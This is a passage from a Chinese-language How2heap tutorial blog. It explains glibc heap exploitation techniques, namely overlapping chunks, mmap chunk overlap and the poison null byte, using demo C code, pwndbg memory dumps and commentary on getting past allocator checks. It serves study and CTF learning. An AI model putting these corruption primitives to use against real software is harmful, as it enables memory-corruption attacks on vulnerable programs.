src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-42.png#clientId=u347f053a-7aac-4&from=paste&height=337&id=ub7194792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=673&originWidth=1025&originalType=binary&size=589779&status=done&style=none&taskId=u03ef26d3-2974-4be4-84f7-dbebae19735&width=512.5" alt="image.png"><br>查看此时 heap<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-43.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=u5270233b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=680&originalType=binary&size=407793&status=done&style=none&taskId=ufa6339f8-57b8-46f0-bb5e-331d1df509f&width=340" alt="image.png"><br>输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">chunk p1 from <span class="hljs-number">0x8007010</span> to <span class="hljs-number">0x80073f840</span><br>chunk p2 from <span class="hljs-number">0x8007400</span> to <span class="hljs-number">0x80077e841</span><br>chunk p3 from <span class="hljs-number">0x80077f0</span> to <span class="hljs-number">0x8007bd842</span><br>chunk p4 from <span class="hljs-number">0x8007be0</span> to <span class="hljs-number">0x8007fc843</span><br>chunk p5 from <span class="hljs-number">0x8007fd0</span> to <span class="hljs-number">0x80083b8</span><br></code></pre></td></tr></table></figure><p>然后填充赋值<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-44.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u105dc4ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=633&originWidth=982&originalType=binary&size=623807&status=done&style=none&taskId=u03d819ac-4cd2-486e-9a66-f124ca178ae&width=491" alt="image.png"><br>查看<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-45.png#clientId=u347f053a-7aac-4&from=paste&height=211&id=ue6c8de7d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1079&originalType=binary&size=445916&status=done&style=none&taskId=uce6ac4ca-4934-49e8-b21e-de027200e44&width=539.5" alt="image.png"><br>此时释放 p4，因为 p5 的存在所以 p4 不会被合并。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-46.png#clientId=u347f053a-7aac-4&from=paste&height=355&id=u797679fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=710&originWidth=864&originalType=binary&size=604887&status=done&style=none&taskId=u2e8d5858-ac53-43e5-8f9a-78adba03a9b&width=432" alt="image.png"><br>然后我们在 p1 触发一个溢出，将 p2 的 size 改写成 p2 和 p3 大小的和。之后更新 presize 的时候是通过 p2 的地址加上 p2 的 size 来寻找的要修改的位置的，这里刚好就把 p4 头部的 presize 给改掉了。<br>之后 free(p2)的时候，分配器就会认为 p4 是下一个块。然后就会错误地将 p3 和 p2 合并。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-47.png#clientId=u347f053a-7aac-4&from=paste&height=477&id=u0779c540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1095&originalType=binary&size=1034227&status=done&style=none&taskId=u5fc07d71-872d-4906-b822-27999e48bb6&width=547.5" alt="image.png"><br>这时候 malloc 一个大小 2000 的堆 p6&lt;0xbd1，返回给 p6 的地址就是 p2 的地址了，p6 内部也包含了未被 free 的 p3，又造成了 overlapping，修改 p6 内容即可修改 p3 内容。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-48.png#clientId=u347f053a-7aac-4&from=paste&height=461&id=ud4e0d6d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=922&originWidth=1062&originalType=binary&size=593880&status=done&style=none&taskId=u9824bb34-39a1-41f9-8491-007382d7ca3&width=531" alt="image.png"><br>我们就可以用 p6 改写 p3 中的任何数据。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-49.png#clientId=u347f053a-7aac-4&from=paste&height=45&id=u8a504495&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=385&originalType=binary&size=23281&status=done&style=none&taskId=ufc137763-aa72-417e-b0e3-19618068a5e&width=210.5" alt="image.png"><br>查看 p3 数据<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-50.png#clientId=u347f053a-7aac-4&from=paste&height=103&id=uff58dfc3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=1821&originalType=binary&size=351670&status=done&style=none&taskId=u79b992fb-5ce9-4fef-a0c3-fa77c8646f3&width=910.5" alt="image.png"><br>修改之后<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-51.png#clientId=u347f053a-7aac-4&from=paste&height=373&id=ue02a99dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1803&originalType=binary&size=1230606&status=done&style=none&taskId=u61a5de77-4b93-4de2-a164-2ca52e95455&width=901.5" alt="image.png"><br>与之前的 overlapping 相比，之前的是释放后修改 size，重新申请后覆盖了后面的堆；这个是先修改 size,使之大小覆盖了后面的堆，再释放后和已释放的大后个堆合并，包含了要覆盖的堆，重新申请后即可覆盖包含的堆的内容。</p><h1 id="mmap-overlapping-chunks-2-28"><a href="#mmap-overlapping-chunks-2-28" class="headerlink" title="mmap_overlapping_chunks-2.28"></a>mmap_overlapping_chunks-2.28</h1><p>代码翻译如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span>* ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配三个大小为 0x100000 的 chunk \n\n&quot;</span>);<br><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* top_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 块位于 Libc 上方： %p\n&quot;</span>,top_ptr);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第二个 mmap 块位于 Libc 下方： %p\n&quot;</span>, mmap_chunk_2);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 块低于第二个 mmap 块: %p\n&quot;</span>, mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n当前系统内存布局\n&quot;</span> \<br><span class="hljs-string">&quot;================================================\n&quot;</span> \<br><span class="hljs-string">&quot;running program\n&quot;</span> \<br><span class="hljs-string">&quot;heap\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;third mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;second mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;LibC\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;ld\n&quot;</span> \<br><span class="hljs-string">&quot;first mmap chunk\n&quot;</span><br><span class="hljs-string">&quot;===============================================\n\n&quot;</span> \<br>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 的 prev_size: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 的 size: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n&quot;</span>);<br>    mmap_chunk_3[<span class="hljs-number">-1</span>] = (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="hljs-number">-1</span>]) + (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="hljs-number">-1</span>]) | <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在改掉的第三个 mmap 块的大小是: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉第三个 mmap 块,\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;再分配一个很大的 mmap chunk\n&quot;</span>);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* overlapping_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新申请的 Overlapped chunk 在: %p\n&quot;</span>, overlapping_chunk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的大小是: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">int</span> distance = mmap_chunk_2 - overlapping_chunk;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新的堆块与第二个 mmap 块之间的距离: 0x%x\n&quot;</span>, distance);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入之前 mmap chunk2 的 index0 写的是: %llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;编辑 overlapping chunk 的值\n&quot;</span>);<br>    overlapping_chunk[distance] = <span class="hljs-number">0x1122334455667788</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写之后第二个 chunk 的值: 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的值: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新块已与先前的块重叠\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>一开始申请了 3 个 0x100000 大小的堆<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-52.png#clientId=u38185df4-f4d6-4&from=paste&height=418&id=JCTtJ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=835&originWidth=791&originalType=binary&size=677675&status=done&style=none&taskId=u9abe04a3-7168-40a6-9733-d55ff18f436&width=395.5" alt="image.png"><br>可以看到，普通堆区并没有分配的 0x100000 大小的堆。<br>然后查看相应的内存布局：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; n<br>The first mmap chunk goes directly above LibC: <span class="hljs-number">0x7fffff6a0010</span><br>The second mmap chunk goes below LibC: <span class="hljs-number">0x7fffff520010</span><br>The third mmap chunk goes below the second mmap chunk: <span class="hljs-number">0x7ffffef20010</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff6a0000</span><br><span class="hljs-number">0x7fffff6a0000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff6a0010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff520000</span><br><span class="hljs-number">0x7fffff520000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff520010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7ffffef20000</span><br><span class="hljs-number">0x7ffffef20000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7ffffef20010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后把第三个的 size 改成 0x202002<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-53.png#clientId=u38185df4-f4d6-4&from=paste&height=309&id=njK7W&margin=%5Bobject%20Object%5D&name=image.png&originHeight=618&originWidth=1017&originalType=binary&size=646248&status=done&style=none&taskId=u334e294b-3df8-4042-80a0-c97fe1330ba&width=508.5" alt="image.png"><br>free 掉第三个，然后再去 malloc(0x300000)<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-54.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=XX3vY&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=582&originalType=binary&size=44129&status=done&style=none&taskId=u7f6741db-376b-47c4-8b1a-3c71138b5fb&width=291" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-55.png#clientId=u38185df4-f4d6-4&from=paste&height=31&id=JApc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=62&originWidth=559&originalType=binary&size=46123&status=done&style=none&taskId=u3a66a5c0-d5c7-442f-9723-717b01d968d&width=279.5" alt="image.png"><br>新块距离第二个 mmap 块 0x42000<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-56.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=EofbB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=886&originalType=binary&size=55992&status=done&style=none&taskId=ude624104-d595-499b-90f6-482b630f2ba&width=443" alt="image.png"><br>写入前 mmap 块 2 的索引 0 的值：0<br>写入后：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-57.png#clientId=u38185df4-f4d6-4&from=paste&height=305&id=OfhSX&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1033&originalType=binary&size=694967&status=done&style=none&taskId=u876b92d0-802b-4c31-8f55-072f7bb7b26&width=516.5" alt="image.png"><br>这样通过对新创建的堆块进行写操作就可以覆盖掉原本第二个那里的数据。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-58.png#clientId=u38185df4-f4d6-4&from=paste&height=469&id=nhwuf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=875&originalType=binary&size=878998&status=done&style=none&taskId=u206739db-6236-4085-942e-83ed57c6cd1&width=437.5" alt="image.png"></p><h1 id="poison-null-byte-2-23"><a href="#poison-null-byte-2-23" class="headerlink" title="poison_null_byte-2.23"></a>poison_null_byte-2.23</h1><p><strong>翻译：</strong><br>这个技术可被用于当可以被 malloc 的区域（也就是 heap 区域）存在一个单字节溢出漏洞的时候。<br>我们先分配 0x100 个字节的内存，代号’a’。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-59.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u5332779a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1052&originalType=binary&size=407596&status=done&style=none&taskId=u9d6172d7-16fa-44c2-aa70-87ac6d04b53&width=526" alt="image.png"><br>如果我们想要去溢出 a 的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是 0x108。<br>为什么是 0x108 呢，是因为所以 chunk 的头部需要占用 0x10 字节，但是 chunk 可以使用下一个 chunk 头部的 prev_size 位，就节省了 0x8 字节，所以最后是占用了 0x108 字节。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-60.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=u8b4851bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=577&originWidth=1365&originalType=binary&size=728992&status=done&style=none&taskId=u63a5e533-4198-4fbe-a191-c2dca5db548&width=682.5" alt="image.png"><br>然后接着我们分配 0x200 个字节，代号’b’。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-61.png#clientId=u347f053a-7aac-4&from=paste&height=309&id=ue93ab3d7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=617&originWidth=1148&originalType=binary&size=649735&status=done&style=none&taskId=u9dc10b62-3b11-496b-95de-9caf3992412&width=574" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-62.png#clientId=u347f053a-7aac-4&from=paste&height=148&id=uc5e70fd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=295&originWidth=538&originalType=binary&size=159216&status=done&style=none&taskId=u63231e7b-2f8d-4edc-a4fc-2f82a057732&width=269" alt="image.png"><br>再分配 0x100 个字节，代号’c’。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-63.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u423519cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1133&originalType=binary&size=405738&status=done&style=none&taskId=u94a732ca-f9f8-4ab6-84f2-7db0ec08c52&width=566.5" alt="image.png"><br>然后分配一个 0x100 字节的 barrier 在 0x8008440，以便在释放时 c 不会与顶部块合并（这个障碍并不是绝对必要的，但是可以让事情变得不那么混乱）<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-64.png#clientId=u347f053a-7aac-4&from=paste&height=267&id=ub82ff069&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=510&originalType=binary&size=250039&status=done&style=none&taskId=ud073f0fb-3f9f-4b25-9808-51e3b549156&width=255" alt="image.png"><br>在新版 glibc 环境下，我们需要在 b 内部更新 size 来逃避检测 <strong>‘chunksize(P) != prev_size (next_chunk(P))’</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><span class="hljs-built_in">free</span>(b)<br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-65.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=uc80f2690&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=685&originalType=binary&size=374695&status=done&style=none&taskId=u0671d3d9-a34a-469a-803d-96d98691d0d&width=342.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-66.png#clientId=u347f053a-7aac-4&from=paste&height=28&id=u625cb874&margin=%5Bobject%20Object%5D&name=image.png&originHeight=56&originWidth=453&originalType=binary&size=23547&status=done&style=none&taskId=u4744f654-460a-4710-984d-040fd67656f&width=226.5" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-67.png#clientId=u347f053a-7aac-4&from=paste&height=151&id=u9e500445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=542&originalType=binary&size=122557&status=done&style=none&taskId=u129e444d-eeb5-4bda-a8a7-57a90e3829e&width=271" alt="image.png"></p><p>我们在 a 实现一个单字节的 null byte 溢出。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-68.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u14eaae63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1095&originalType=binary&size=548441&status=done&style=none&taskId=ubb192e74-9239-455a-a70e-f3635c1e1cf&width=547.5" alt="image.png"><br>可以看到 b 的 size 变成了 0x200<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-69.png#clientId=u347f053a-7aac-4&from=paste&height=196&id=udad05044&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=560&originalType=binary&size=215629&status=done&style=none&taskId=u54d31539-3a17-4293-b8d9-4d46d24dc77&width=280" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-70.png#clientId=u347f053a-7aac-4&from=paste&height=147&id=t6067&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=542&originalType=binary&size=192046&status=done&style=none&taskId=ue48f1fd2-2a78-47b3-bc68-82d30fc82ee&width=271" alt="image.png"><br>为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一个 c.prev_size 字段，字段的大小是很好计算的，即</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">(<span class="hljs-number">0x211</span> &amp; <span class="hljs-number">0xff00</span>) == <span class="hljs-number">0x200</span><br></code></pre></td></tr></table></figure><p>然而此时 c.presize = 0x210 但是没关系我们还是能逃过掉前面那个检查，根据</p><ul><li>chunksize(P) == _((size_t_)(b-0x8)) == 0x200</li></ul><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-71.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=udb9d75df&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=349&originalType=binary&size=15531&status=done&style=none&taskId=u872d4aa7-ddf6-44cb-88ed-dcefeb1f8c9&width=174.5" alt="image.png"></p><ul><li>prev_size (next_chunk(P)) == _(size_t_)(b-0x10 + 0x200) == 0x200</li></ul><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-72.png#clientId=u347f053a-7aac-4&from=paste&height=26&id=u62a4d804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=51&originWidth=464&originalType=binary&size=20487&status=done&style=none&taskId=u592a1b66-9865-4f94-aa68-12c1ad333e3&width=232" alt="image.png"><br>可以成功绕过检查。另外 unsorted bin 中的 chunk 大小也变成了 0x200<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-73.png#clientId=u347f053a-7aac-4&from=paste&height=299&id=u041b16b4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=1095&originalType=binary&size=563900&status=done&style=none&taskId=u067af4f7-7887-4809-bbff-9fde5b59098&width=547.5" alt="image.png"><br>此时 c 附近的内存布局为：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-74.png#clientId=u38185df4-f4d6-4&from=paste&height=89&id=ubab11d5a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=630&originalType=binary&size=133263&status=done&style=none&taskId=u00b8c7ae-fce5-42f9-af3e-3ee466a238b&width=315" alt="image.png"><br>然后 malloc 一个大小 0x100 的<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-75.png#clientId=u347f053a-7aac-4&from=paste&height=246&id=u5287ab82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=717&originalType=binary&size=211710&status=done&style=none&taskId=u47f0c58b-bc17-41e6-8618-b79ccd5522f&width=358.5" alt="image.png"><br>返回给 b1 的地址就是前面 free 掉的 b 的地址。<br>这个时候 chunk c 的 prev_size 本应该变为 0xf0（0x200-0x110)。<br>注意分配堆块后，发生变化的是 fake c.prev_size，而不是 c.prev_size。现在 C 的 presize 在原来地址的前 0x10 bytes 处（2 个单元）更新。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">10</span>gx c<span class="hljs-number">-0x20</span><br><span class="hljs-number">0x8008310</span>:      <span class="hljs-number">0x00000000000000f0</span>      <span class="hljs-number">0x0000000000000000</span>   &lt;-fake chunk<br><span class="hljs-number">0x8008320</span>:      <span class="hljs-number">0x0000000000000210</span>      <span class="hljs-number">0x0000000000000110</span>   &lt;-chunk c<br><span class="hljs-number">0x8008330</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008340</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008350</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk。但其实这片内存已经被分配给了 chunk b1。<br>再 b2 = malloc(0x80);<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-76.png#clientId=u347f053a-7aac-4&from=paste&height=325&id=u67d2c401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=765&originalType=binary&size=432623&status=done&style=none&taskId=uad2f58c3-1b4a-4bc6-bceb-b69c2430848&width=382.5" alt="image.png"><br>查看 b2 内容<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-77.png#clientId=u347f053a-7aac-4&from=paste&height=43&id=u9891ba02&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=1408&originalType=binary&size=66799&status=done&style=none&taskId=u4abc7e76-7fc1-430b-b003-67a1ca162ab&width=704" alt="image.png"><br>之后我们将 b1 和 c 依次 free。这会导致 b1 开始的位置一直到 c 的末尾中间的内存会合并成一块。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-78.png#clientId=u347f053a-7aac-4&from=paste&height=245&id=ue1b01bcc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=690&originalType=binary&size=307368&status=done&style=none&taskId=u66134a2a-6185-42df-8286-348ccc688e4&width=345" alt="image.png"><br>为什么会发生合并？<br>在我们第一次 free(b)之前，进行了如下的设置：</p><figure class="highlight 